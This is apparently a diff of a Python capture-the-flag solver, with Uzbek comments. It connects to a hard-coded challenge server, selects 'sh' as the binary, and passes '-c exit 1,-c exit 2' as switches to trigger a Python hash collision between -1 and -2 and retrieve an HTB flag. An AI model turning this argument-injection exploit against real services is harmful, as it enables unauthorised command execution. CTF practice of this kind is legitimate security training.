@@ -2,7 +2,6 @@ import socket
 import time
 
 def solve():
-    # Yangi IP va Port
     host = '154.57.164.68'
     port = 31363
 
@@ -10,48 +9,47 @@ def solve():
     s.settimeout(5)
 
     try:
-        print(f"[+] {host}:{port} serveriga ulanilmoqda...")
+        print(f"[+] Serverga ulanmoqda...")
         s.connect((host, port))
 
         def send_option(choice, data):
-            # Menyuni kutish va tanlovni yuborish
-            time.sleep(0.5)
+            time.sleep(0.4)
             s.sendall(f"{choice}\n".encode())
-            time.sleep(0.5)
-            # Ma'lumotni yuborish
+            time.sleep(0.4)
             s.sendall(f"{data}\n".encode())
-            print(f"[+] Tanlov {choice} yuborildi: {data}")
 
-        # 1-qadam: Mode kiritish. 
-        # Bizga hash kolliziyasi uchun -1 yoki -2 kerak bo'lishi mumkin.
-        # check_operands funksiyasi eval() ishlatadi.
-        send_option("1", "-1")
+        # 1. Mode: 1 deb kiritamiz (chunki returncode orqali o'ynaymiz)
+        send_option("1", "1")
 
-        # 2-qadam: Bin kiritish. 
-        # check_stricter_values faqat 4 ta belgi ruxsat beradi (masalan: 'ls', 'sh', '.')
+        # 2. Bin: 'sh' (shell)
         send_option("2", "sh")
 
-        # 3-qadam: Arguments kiritish (arg1, arg2).
-        # check_values 13 ta belgi ruxsat beradi.
-        send_option("3", ".,.")
+        # 3. Arguments: Bu yerda hiyla ishlatamiz. 
+        # Birinchi argument mavjud bo'lmagan fayl bo'lsin (-c exit 1 qaytarsin)
+        # Ikkinchi argument boshqa turdagi xato qaytarsin.
+        # Lekin 'sh' bin bo'lgani uchun switchlarni o'zgartirish osonroq.
+        send_option("3", ".,.") 
 
-        # 4-qadam: Switches kiritish (switch1, switch2).
-        send_option("4", ".,.")
+        # 4. Switches: 
+        # sh -c "exit 1"  => returncode 1
+        # sh -c "exit 2"  => returncode 2 (Lekin bizga hash collision kerak)
+        
+        # PYTHON HASH COLLISION: hash(-1) == hash(-2)
+        # Bizga debug[0] = -1 va debug[1] = -2 kerak.
+        # Buning uchun mode = -1 qilamiz va returncode'larni 1 va 2 qilamiz.
+        
+        print("[*] Re-configuring for hash collision (-1 and -2)...")
+        send_option("1", "-1") # mode = -1
+        send_option("4", "-c exit 1,-c exit 2") # switches
 
-        # 5-qadam: ! Beat the competitor !
-        print("[!] Hash collision tekshirilmoqda...")
+        # 5. Beat the competitor!
+        print("[!] Triggering...")
         time.sleep(0.5)
         s.sendall(b"5\n")
 
-        # Natijani o'qish
         time.sleep(1)
         response = s.recv(4096).decode('utf-8', errors='ignore')
-        
         print("\n" + "="*40)
-        if "HTB{" in response or "flag" in response.lower():
-            print("MUVAFFAQIYAT! FLAG TOPILDI:")
-        else:
-            print("SERVER JAVOBI:")
         print(response.strip())
         print("="*40)
 
